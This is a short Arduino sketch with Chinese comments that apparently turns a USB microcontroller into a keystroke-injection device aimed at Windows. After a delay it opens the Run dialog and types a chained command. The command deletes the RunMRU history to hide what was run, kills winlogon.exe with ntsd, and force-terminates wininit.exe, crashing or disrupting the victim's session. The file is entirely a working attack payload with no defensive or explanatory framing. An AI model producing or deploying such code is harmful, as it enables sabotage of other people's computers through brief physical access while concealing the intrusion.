void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd /c start /min cmd /c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f&cmd /c start /min cmd /c ntsd -c q -pn winlogon.exe 1>nul 2>nul&taskkill /f /im wininit.exe 2>nul");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
